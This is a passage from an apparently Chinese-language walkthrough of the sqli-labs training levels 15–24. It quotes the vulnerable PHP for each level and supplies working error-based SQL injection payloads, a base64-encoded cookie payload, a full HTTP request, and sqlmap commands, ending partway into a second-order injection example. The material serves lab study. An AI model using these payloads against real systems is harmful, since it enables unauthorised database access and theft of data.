+$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;$uname and password&#x3D;$passwd LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>不再报错，所以只能使用盲注</p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注</td>
+<td>id=（$id）</td>
+</tr>
+</tbody></table>
+<p>闭合方式不同</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注</td>
+<td>passwd=’$passwd’</td>
+</tr>
+</tbody></table>
+<p>对usname使用了过滤</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function check_input($value)
+	&#123;
+	if(!empty($value))
+		&#123;
+		&#x2F;&#x2F; truncation (see comments)
+		$value &#x3D; substr($value,0,15);
+		&#125;
+
+		&#x2F;&#x2F; Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc())				&#x2F;&#x2F; 当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线)
+			&#123;									&#x2F;&#x2F;  and 空字符会自动转为含有反斜线的溢出字符。
+			$value &#x3D; stripslashes($value);		&#x2F;&#x2F; 去除反斜杠
+			&#125;
+
+		&#x2F;&#x2F; Quote if not a number
+		if (!ctype_digit($value))				&#x2F;&#x2F; 判断是否是以数字
+			&#123;
+			$value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;		&#x2F;&#x2F; 如果不是数字则将字符串转意，用来防止sql注入
+			&#125;
+		
+	else
+		&#123;
+		$value &#x3D; intval($value);
+		&#125;
+	return $value;
+	&#125;
+	
+$uname&#x3D;check_input($_POST[&#39;uname&#39;]);  
+
+$passwd&#x3D;$_POST[&#39;passwd&#39;];
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D; $uname LIMIT 0,1&quot;;
+
+
+if select 结果正确:
+    # 更新语句 使用单引号拼接 passwd
+    $update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;
+
+    if mysql 报错:
+            print_r(mysql_error());
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的SQL语句因为username被过滤，所以无法注入。但是下面的update语句中的passwd没有被过滤啊。</p>
+<p>由于可以报错，所以我们可以使用在passwd报错注入，注意username一定要正确。否则连passwdsql语句都执行不到。</p>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>user-agent = ‘user-agent’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+	$result1 &#x3D; mysql_query($sql);
+	$row1 &#x3D; mysql_fetch_array($result1);
+		if($row1)
+			&#123;
+			echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;
+			$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>与之前的注入有所不同的是，这里的注入是通过http头部进行注入，通过user-agent，REMOTE_ADDR进行注入，但是 REMOTE_ADDR不可伪造。</p>
+<p>因为后面的语句不能随便注释，所以我们需要引号注释。</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) and &#39;1&#39; &#x3D; &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>user-agent = ‘referer’</td>
+</tr>
+</tbody></table>
+<p>与上题区别在于referer</p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>username=’$cookee’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;&#39;$cookee&#39; LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里我们可以通过修改cookie便可以进行注入</p>
+<p>需要注意body中不能有submit</p>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D; 1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIeadmin&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>那么sqlmap的语句怎么写呢</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;Less-20&#x2F;&quot; --cookie&#x3D;&quot;uname&#x3D;admin*&quot; --batch --dbms&#x3D;MySQL --random-agent  --technique&#x3D;U -v 3 --level&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Advanced-Injection"><a href="#Advanced-Injection" class="headerlink" title="Advanced Injection"></a>Advanced Injection</h2><p>从这里开始变会出现各种方式的过滤，于是开始通读源码，掌握过滤与绕过的方式。</p>
+<h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>username=(‘$cookee’)</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+&#x2F;&#x2F; 如果Cookie[uname]没有值
+
+if(!issert(cookie[]))				
+&#123;
+	if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))		&#x2F;&#x2F; 都有值
+	&#123;
+		$uname &#x3D; check_input($_POST[&#39;uname&#39;]);&#96;					&#x2F;&#x2F; 过滤.
+		$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);
+		
+	
+		$sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+		$result1 &#x3D; mysql_query($sql);
+		$row1 &#x3D; mysql_fetch_array($result1);
+		if($row1)												&#x2F;&#x2F; 查询出结果
+		&#123;
+			setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);		&#x2F;&#x2F; 重新设置cookie[uname]
+			print_r(mysql_error());													&#x2F;&#x2F; 报错, 所以有使用报错注入的可能性
+
+		&#125;
+		else
+		｛
+			print_r(mysql_error());		
+		｝
+	&#125;
+&#125;
+else														&#x2F;&#x2F; cookie[uname]不为空
+&#123;
+	if(!isset($_POST[&#39;submit&#39;]))							&#x2F;&#x2F; POST上传的submit为空
+	&#123;
+		$cookee &#x3D; $_COOKIE[&#39;uname&#39;];
+		$cookee &#x3D; base64_decode($cookee);					&#x2F;&#x2F; base64解密
+		$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;(&#39;$cookee&#39;) LIMIT 0,1&quot;;		&#x2F;&#x2F; sql查询语句
+		$result&#x3D;mysql_query($sql);
+		if (!$result)										&#x2F;&#x2F; 没有结果说明语句有问题
+  			&#123;
+  				die(&#39;Issue with your mysql: &#39; . mysql_error());
+  			&#125;
+		$row &#x3D; mysql_fetch_array($result);
+		if($row)
+		&#123;
+			&#x2F;&#x2F; 输出uname与password因此可以用联合查询
+		&#125;
+
+	&#125;
+	else
+	&#123;
+		&#x2F;&#x2F; 设置cookie[uname]
+	&#125;
+&#125;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从源码中可以知道，这个题与上一个题的区别就在于这个题的cookie值需要经过base64加密。</p>
+<pre class="line-numbers language-报文" data-language="报文"><code class="language-报文">POST &#x2F;Less-21&#x2F; HTTP&#x2F;1.1
+Host: a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn
+Content-Length: 17
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+Origin: http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn
+Content-Type: application&#x2F;x-www-form-urlencoded
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.63 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Referer: http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn&#x2F;Less-21&#x2F;
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8
+Cookie: uname&#x3D;MScpIEFORCAoU0VMRUNUIDEzNDMgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4NzE2YTZhNzE3MSwoU0VMRUNUIE1JRCgoSUZOVUxMKENBU1QoKHRhYmxlX3NjaGVtYSkgQVMgTkNIQVIpLDB4MjApKSwxLDU0KSBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgTElNSVQgMCwxKSwweDcxNmI2MjZhNzEsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlBMVUdJTlMgR1JPVVAgQlkgeClhKS0tIHV3SWVhZG1pbicgQU5EIChTRUxFQ1QgMTM0MyBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHg3MTZhNmE3MTcxLChTRUxFQ1QgTUlEKChJRk5VTEwoQ0FTVCgodGFibGVfc2NoZW1hKSBBUyBOQ0hBUiksMHgyMCkpLDEsNTQpIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyBMSU1JVCAwLDEpLDB4NzE2YjYyNmE3MSxGTE9PUihSQU5EKDApKjIpKXggRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuUExVR0lOUyBHUk9VUCBCWSB4KWEpIC0tIA&#x3D;&#x3D;
+Connection: close
+
+uname&#x3D;1&amp;passwd&#x3D;1&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;MScpIEFORCAoU0VMRUNUIDEzNDMgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4NzE2YTZhNzE3MSwoU0VMRUNUIE1JRCgoSUZOVUxMKENBU1QoKHRhYmxlX3NjaGVtYSkgQVMgTkNIQVIpLDB4MjApKSwxLDU0KSBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgTElNSVQgMCwxKSwweDcxNmI2MjZhNzEsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlBMVUdJTlMgR1JPVVAgQlkgeClhKS0tIHV3SWVhZG1pbicgQU5EIChTRUxFQ1QgMTM0MyBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHg3MTZhNmE3MTcxLChTRUxFQ1QgTUlEKChJRk5VTEwoQ0FTVCgodGFibGVfc2NoZW1hKSBBUyBOQ0hBUiksMHgyMCkpLDEsNTQpIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyBMSU1JVCAwLDEpLDB4NzE2YjYyNmE3MSxGTE9PUihSQU5EKDApKjIpKXggRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuUExVR0lOUyBHUk9VUCBCWSB4KWEpIC0tIA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;a481de85-cadc-4d56-b494-b1d63ffcc52e.node4.buuoj.cn&#x2F;Less-21&#x2F; --technique&#x3D;U --random-agent --cookie&#x3D;&quot;uname&#x3D;*&quot; --tamper&#x3D;&quot;base64encode&quot; --dbms&#x3D;MySQL  --flush-session --technique&#x3D;U -v 3 --dbs
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>username=”cookie”</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+$cookee &#x3D; base64_decode($cookee);
+			$cookee1 &#x3D; &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;
+			echo &quot;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;
+			$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;$cookee1 LIMIT 0,1&quot;;
+			<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>基本结构与上一题相同只不是cookie的闭合方式变为了 <strong>“cookie”</strong></p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if(isset($_GET[&#39;id&#39;]))
+&#123;
+$id&#x3D;$_GET[&#39;id&#39;];
+
+&#x2F;&#x2F;filter the comments out so as to comments should not work
+$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;									&#x2F;&#x2F; 对注释符的过滤
+$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;
+$replace &#x3D; &quot;&quot;;
+$id &#x3D; preg_replace($reg, $replace, $id);
+$id &#x3D; preg_replace($reg1, $replace, $id);
+&#x2F;&#x2F;logging the connection parameters to a file for analysis.
+$fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);
+fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+fclose($fp);
+
+&#x2F;&#x2F; connectivity 
+
+
+$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>由于对注释符进行了过滤，所以我们考虑使用简单闭合即可。</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) and &#39;1&#39; &#x3D; 1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这个题目有些特殊，涉及到了二次注入。再说明二次注入前，我们先看一下源码</p>
+<p>最开始我们看一下每个文件的功能</p>
+<pre class="line-numbers language-文件" data-language="文件"><code class="language-文件">failed.php $_COOKIE[&quot;Auth&quot;]不存在时，报错并退回主页面。
+
+forget.php 一个普通html页面
+
+index.php 首页，没有后端。
+
+login.php 一个普通的页面
+
+login_create.php 创建新的用户，我们需要讲一下的文件
+
+login.php 登录时使用的后端代码
+
+new_user 创建新用户时页面
+
+pass_change.php 改变密码时的后端代码
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="login-create-php"><a href="#login-create-php" class="headerlink" title="login_create.php"></a>login_create.php</h4><p>下面时login_create.php的代码分析</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>		<span class="token comment">// 将字符转义</span>
+	<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>					<span class="token comment">// 因为被username转义了所以在sql语句中会被当成一个普通字符串执行</span>
+	<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// true or false</span>
+  	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>													<span class="token comment">// mysql_fetch_row() 函数从结果集中取得一行作为数字数组。</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> 	<span class="token comment">// 用户已将存在</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token comment">// 弹窗报错</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>	
+		 <span class="token keyword">if</span><span class="token punctuation">(</span>两次密码相同<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		 <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users ( username, password) values(\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span> <span class="token comment">// 这里的\"是为了使""中的"不作为字符串运行</span>
+																							<span class="token comment">// ,从而使username作为变量执行</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token keyword">function</span> <span class="token function-definition function">sqllogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+	<span class="token comment">// 过滤</span>
+   <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>						
+   <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   
+   <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
+   
+   <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be real smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>就是查询语句没什么好说的</p>
+<h4 id="pass-change-php"><a href="#pass-change-php" class="headerlink" title="pass_change.php"></a>pass_change.php</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token keyword">if</span><span class="token punctuation">(</span>上传<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	
+	<span class="token comment">// 都经过过滤</span>
+	<span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">// mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span>
+	<span class="token comment">//下列字符受影响：\x00,\n,\r,\, ', ", \x1a</span>
+
+	<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	<span class="token keyword">if</span><span class="token punctuation">(</span>两次密码相同<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>	
+	
+		<span class="token comment">// 更新语句,</span>
+		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
+		<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		
+		<span class="token comment">// 取得update影响的行数</span>
+		<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_affected_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
